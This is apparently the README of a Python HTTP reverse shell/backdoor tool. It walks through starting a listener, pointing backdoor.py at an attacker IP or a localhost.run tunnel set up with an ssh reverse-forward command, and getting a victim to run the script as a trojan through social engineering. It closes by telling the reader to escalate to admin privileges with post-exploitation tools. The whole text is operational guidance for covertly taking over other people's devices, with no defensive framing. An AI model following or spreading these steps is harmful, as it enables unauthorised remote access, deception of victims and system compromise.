# HTTP Reverse Shell/Backdoor

- Opens a backdoor on executed device via HTTP protocol

## Usage

### Attack over LAN
- Start listener
    ```bash
    python3 listener.py
    ```
    > Default port = 8080
    > Change port in `listerner.py` on line 33 if another service is using 8080 port

- Edit `IP` and `PORT` values in `backdoor.py` on line 48
    ```python
    IP = 'attacker_local_ip'
    PORT = attacker_port  # 8080
    ```

### Attack over the internet

- Start a ssh tunnel on attacker's device.
    ```bash
    ssh -R 80:localhost:<listener_port>
    ```
    > Note : Replace <listener_port> with port on which local server is running


- Copy link that will be available after successfully tunelling between attacker's machine and localhost.run server.
    ```
    example : <random_characters>.localhost.run
    ```

- Start Listener on your localhost using
    ```bash
    python3 listener.py
    ```

- Replace copied link in `backdoor.py` on line 48.
    ```python
    IP = '<random_characters>.localhost.run'
    ```

- Use social engineering to make user to execute the python file or created standalone executable/trojan. Use python to run backdoor.py script.
    ```
    python3 backdoor.py
    ```

- Now use post exploitation tools to gain admin priviliges
